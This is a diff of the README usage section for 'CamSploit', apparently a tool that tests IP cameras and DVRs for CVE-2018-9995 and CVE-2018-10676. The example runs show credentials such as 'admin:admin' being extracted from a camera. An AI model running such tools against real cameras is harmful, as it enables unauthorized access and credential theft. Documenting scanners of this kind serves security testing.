@@ -22,7 +22,7 @@ Required option 'show-exploit' is missing.
 
   --output               (Default: output.camsploit.txt) Output file (it is optional).
 
-  --exploits             List of exploits separated by spaces, example CVE_2018_9995 Default_Password_CeNova
+  --exploits             List of exploits separated by spaces, example CVE_2018_9995,CVE-2018-10676
 
   --help                 Display this help screen.
 
@@ -33,23 +33,24 @@ Required option 'show-exploit' is missing.
 ```
 dotnet CamSploit.dll  --show-exploit  ALL
 CVE-2018-9995
-Cenova_Default_Credentials
+CVE-2018-10676
 
 dotnet CamSploit.dll  --show-exploit  CVE-2018-9995
 CVE-2018-9995: Gets DVR Credentials in many vendors that responds using the banner 'Server: GNU rsp/1.0'
 
 dotnet CamSploit.dll  --rhost  192.168.0.1:8080
 Testing CVE-2018-9995 for Cam 192.168.0.1:8080
-The Cam 192.168.0.1:8080 is not vulnerable or it is not available for the CVE-2018-9995
-Testing Cenova_Default_Credentials for Cam 192.168.0.1:8080
-The Cam 192.168.0.1:8080 is not vulnerable or it is not available for the Cenova_Default_Credentials
+The Cam 192.168.0.1:8080 is not vulnerable for the CVE-2018-9995
+Testing CVE-2018-10676 for Cam 192.168.0.1:8080
+The Cam 192.168.0.1:8080 is not vulnerable for the CVE-2018-10676
 
 dotnet CamSploit.dll  --rhost  192.168.0.1:8080 --exploits CVE-2018-9995
 Testing CVE-2018-9995 for Cam 192.168.0.1:8080
-The Cam 192.168.0.1:8080 is not vulnerable or it is not available for the CVE-2018-9995
+The Cam 192.168.0.1:8080 is not vulnerable for the CVE-2018-9995
 
-dotnet CamSploit.dll  --rhost  192.168.0.1:8080 --exploits CVE-2018-9995,Cenova_Default_Credentials --output "result.txt"
+dotnet CamSploit.dll  --rhost  192.168.0.1:8080 --exploits CVE-2018-9995,CVE-2018-10676 --output "result.txt"
 Testing CVE-2018-9995 for Cam 192.168.0.1:8080
-The Cam 192.168.0.1:8080 is not vulnerable or it is not available for the CVE-2018-9995
-Testing CVE-2018-9995 for Cam 192.168.0.1:8080Testing Cenova_Default_Credentials for Cam 192.168.0.1:8080The Cam 192.168.0.1:8080 is not vulnerable or it is not available for the Cenova_Default_Credentials
+The Cam 192.168.0.1:8080 is vulnerable for the CVE-2018-9995 the result is admin:admin
+Testing CVE-2018-10676 for Cam 192.168.0.1:8080
+The Cam 192.168.0.1:8080 is vulnerable for the CVE-2018-10676 the result is {null}:{null} - Please to get the username and password check the following memory dump:
 ```
